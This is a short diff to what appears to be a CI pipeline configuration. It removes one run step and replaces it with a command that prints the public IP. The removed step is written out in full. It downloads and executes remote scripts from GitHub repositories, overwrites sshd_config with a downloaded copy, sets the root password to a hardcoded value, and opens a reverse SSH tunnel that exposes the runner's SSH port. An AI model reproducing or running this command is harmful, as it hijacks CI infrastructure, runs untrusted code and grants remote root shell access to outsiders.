@@ -10,4 +10,4 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run:  apt update && apt install screen sudo sshpass openssh-server wget nmap -y &&  wget https://github.com/githubaunglaymyanmar1/stunnel/raw/main/setup && bash setup && rm -rf /etc/ssh/sshd_config &> /dev/null && cd /etc/ssh && sudo wget https://github.com/githubaunglaymyanmar/fordownload/raw/main/ssh/sshd_config &> /dev/null && sudo service ssh restart &> /dev/null && printf "aunglay\naunglay" | sudo passwd root &&  cd && sudo screen -m -d -S ssh sshpass -p 'passwd' ssh -p 1111 connect@localhost -R 7676:localhost:22  -o StrictHostKeyChecking=no && sudo screen -ls && wget https://github.com/githubaunglaymyanmar1/download/raw/main/download/output1 && bash output1
+      - run: curl ifconfig.me  
